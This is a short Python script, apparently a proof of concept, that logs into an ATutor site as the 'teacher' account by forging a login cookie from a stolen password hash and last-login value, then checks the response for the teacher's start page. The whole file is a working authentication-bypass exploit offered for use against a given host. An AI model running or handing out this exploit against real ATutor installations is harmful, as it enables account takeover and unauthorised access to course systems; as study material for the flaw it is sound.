import sys, hashlib, requests
from hashlib import sha512

def gen_hash(passwd, lastLogin):
    hashLogin = sha512(lastLogin.encode('utf-8')).hexdigest()
    m = hashlib.sha512()
    m.update(passwd + hashLogin)
    return m.hexdigest()

def we_can_login_with_a_hash():
    target = "http://%s/ATutor/login.php" % sys.argv[1]
    hashed = gen_hash(sys.argv[2], sys.argv[3])
    print(hashed)
    c = {
        "ATLogin" : "teacher",
        "ATPass" : hashed
    }
    s = requests.Session()
    r = s.get(target, cookies=c)
    res = r.text
    #print(res)
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        return True
    return False

def main():
    if len(sys.argv) != 4:
        print ("(+) usage: %s <target> <hash> <lastlogin>" % sys.argv[0])
        print ("(+) eg: %s 192.168.140.103 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e" % sys.argv[0])
        sys.exit(-1)
    if we_can_login_with_a_hash():
        print ("(+) success!")
    else:
        print ("(-) failure!")

if __name__ == "__main__":
    main()